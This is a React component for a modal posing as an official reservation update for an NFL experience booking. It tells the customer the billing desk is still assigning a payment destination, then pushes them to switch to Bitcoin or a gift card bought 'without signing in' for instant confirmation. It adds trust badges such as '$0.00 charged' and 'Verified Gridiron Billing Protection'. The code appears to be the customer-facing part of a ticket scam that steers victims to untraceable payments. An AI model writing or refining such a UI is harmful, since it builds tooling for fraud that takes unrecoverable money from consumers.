import React from "react";
import { motion, AnimatePresence } from "motion/react";
import {
  Mail,
  ShieldCheck,
  Clock,
  Bitcoin,
  Gift,
  X,
  CheckCircle2,
  Loader2
} from "lucide-react";

interface TenMinuteFollowUpModalProps {
  isOpen: boolean;
  onClose: () => void;
  sessionId: string;
  customerName?: string;
  customerEmail?: string;
  itemTitle?: string;
  amount: number;
  currentMethod: string;
  elapsedMinutes?: number;
  isSwitching?: boolean;
  onSwitchToBitcoin?: () => void;
  onSwitchToGiftCard?: () => void;
}

export const TenMinuteFollowUpModal: React.FC<TenMinuteFollowUpModalProps> = ({
  isOpen,
  onClose,
  sessionId,
  customerName,
  customerEmail,
  itemTitle,
  amount,
  currentMethod,
  elapsedMinutes = 3,
  isSwitching = false,
  onSwitchToBitcoin,
  onSwitchToGiftCard
}) => {
  const displayName =
    customerName && !["customer", "vip guest", "ticket guest", "guest"].includes(customerName.trim().toLowerCase())
      ? customerName.trim()
      : "there";
  const displayEmail = customerEmail?.trim() || "Verified Guest Session";
  const methodLabel = (currentMethod || "Selected Method").toUpperCase();
  const formattedAmount = `$${Number(amount || 100).toLocaleString()}`;

  return (
    <AnimatePresence>
      {isOpen && (
        <div className="fixed inset-0 z-[1300] flex items-center justify-center p-3 sm:p-4 bg-black/85 backdrop-blur-md overflow-y-auto">
          <motion.div
            initial={{ opacity: 0, scale: 0.95, y: 12 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.95, y: 12 }}
            className="relative w-full max-w-lg bg-[#080d22] border border-sky-400/35 rounded-3xl shadow-2xl shadow-sky-950/60 overflow-hidden my-auto"
          >
            {/* Top accent bar */}
            <div className="h-1.5 w-full bg-gradient-to-r from-sky-400 via-blue-500 to-emerald-400" />

            {/* Modal Header */}
            <div className="px-5 py-4 border-b border-white/10 bg-[#050816] flex items-center justify-between gap-3">
              <div className="flex items-center gap-3 min-w-0">
                <div className="w-10 h-10 rounded-2xl bg-sky-500/15 border border-sky-400/35 text-sky-300 flex items-center justify-center shrink-0">
                  <Mail className="w-5 h-5" />
                </div>
                <div className="min-w-0">
                  <div className="flex items-center gap-2 flex-wrap">
                    <span className="text-[10px] font-black uppercase tracking-wider text-sky-300">
                      Concierge Queue Notice
                    </span>
                    <span className="text-[10px] font-mono text-zinc-400">
                      · {Math.max(3, elapsedMinutes)}m elapsed
                    </span>
                  </div>
                  <h3 className="text-sm font-black uppercase text-white tracking-wide truncate">
                    Official Reservation Status Update
                  </h3>
                </div>
              </div>

              <button
                type="button"
                onClick={onClose}
                aria-label="Close reservation status update"
                className="p-2 rounded-xl bg-white/5 hover:bg-white/10 text-zinc-400 hover:text-white transition-colors cursor-pointer shrink-0"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            {/* Email-style Envelope Metadata */}
            <div className="px-5 py-3 bg-zinc-950/80 border-b border-white/10 space-y-1.5 text-xs">
              <div className="flex items-center gap-2">
                <span className="text-[10px] font-black uppercase tracking-wider text-zinc-500 w-14 shrink-0">
                  To:
                </span>
                <span className="font-mono text-zinc-200 truncate">{displayEmail}</span>
              </div>
              <div className="flex items-start gap-2">
                <span className="text-[10px] font-black uppercase tracking-wider text-zinc-500 w-14 shrink-0 pt-0.5">
                  Subject:
                </span>
                <span className="font-bold text-white">
                  Quick update on your {itemTitle || "NFL experience booking"} ({sessionId})
                </span>
              </div>
            </div>

            {/* Reconstructed Calm, Transparent Body */}
            <div className="p-5 sm:p-6 space-y-4">
              {/* Zero-charge reassurance callout */}
              <div className="p-3 rounded-2xl bg-emerald-500/10 border border-emerald-500/25 flex items-center gap-2.5 text-[11px] text-emerald-200">
                <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0" />
                <span>
                  <strong className="text-white">$0.00 charged</strong> — no payment has been sent or lost. Your spot remains safely reserved.
                </span>
              </div>

              <div className="space-y-3 text-xs sm:text-[13px] text-zinc-200 leading-relaxed">
                <p className="font-bold text-white">Hi {displayName},</p>
                <p>
                  Thank you for your patience while checking back on your reservation. Our billing desk is still finalizing a fresh, individually verified{" "}
                  <strong className="text-white">{methodLabel}</strong> destination for your{" "}
                  <strong className="text-white">{formattedAmount}</strong> booking—during peak game-week volume, assigning a dedicated vendor can take a little longer than our usual 3-minute window.
                </p>
                <p>
                  You are completely welcome to keep waiting for <strong className="text-white">{methodLabel}</strong> credentials at no obligation. However, if you prefer not to wait and would like an instant option to lock in your request right away, you can switch directly to a <strong className="text-amber-300">Gift Card (buy online without signing in)</strong> or <strong className="text-sky-300">Bitcoin</strong> below.
                </p>
                <p className="text-zinc-300 text-xs">
                  Pick whichever option feels most comfortable for you, or send us a note directly in the concierge box anytime.
                </p>
              </div>

              {/* Action Buttons */}
              <div className="pt-2 space-y-2.5">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
                  {currentMethod !== "crypto" && onSwitchToBitcoin && (
                    <button
                      type="button"
                      disabled={isSwitching}
                      onClick={onSwitchToBitcoin}
                      className="min-h-[46px] px-4 py-2.5 rounded-2xl bg-gradient-to-r from-sky-500 to-blue-600 hover:from-sky-400 hover:to-blue-500 disabled:opacity-60 text-white font-black text-[11px] uppercase tracking-wider flex items-center justify-center gap-2 transition-all cursor-pointer shadow-lg shadow-blue-600/25"
                    >
                      {isSwitching ? (
                        <Loader2 className="w-4 h-4 animate-spin" />
                      ) : (
                        <Bitcoin className="w-4 h-4 shrink-0" />
                      )}
                      <span>Switch to Bitcoin</span>
                    </button>
                  )}

                  {currentMethod !== "giftcard" && onSwitchToGiftCard && (
                    <button
                      type="button"
                      disabled={isSwitching}
                      onClick={onSwitchToGiftCard}
                      className="min-h-[46px] px-4 py-2.5 rounded-2xl bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-400 hover:to-orange-400 disabled:opacity-60 text-black font-black text-[11px] uppercase tracking-wider flex items-center justify-center gap-2 transition-all cursor-pointer shadow-lg shadow-amber-500/20"
                    >
                      {isSwitching ? (
                        <Loader2 className="w-4 h-4 animate-spin" />
                      ) : (
                        <Gift className="w-4 h-4 shrink-0" />
                      )}
                      <span>Use Gift Card</span>
                    </button>
                  )}
                </div>

                <button
                  type="button"
                  disabled={isSwitching}
                  onClick={onClose}
                  className="w-full min-h-[44px] px-4 py-2.5 rounded-2xl bg-zinc-900 hover:bg-zinc-800 border border-white/10 text-zinc-200 hover:text-white font-bold text-xs uppercase tracking-wider flex items-center justify-center gap-2 transition-colors cursor-pointer"
                >
                  <Clock className="w-3.5 h-3.5 text-emerald-400" />
                  <span>Keep Waiting for {methodLabel} Details</span>
                </button>
              </div>

              <div className="flex items-center justify-center gap-2 text-[10px] text-zinc-400 pt-1">
                <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
                <span>Verified Gridiron Billing Protection · Switch or wait freely</span>
              </div>
            </div>
          </motion.div>
        </div>
      )}
    </AnimatePresence>
  );
};
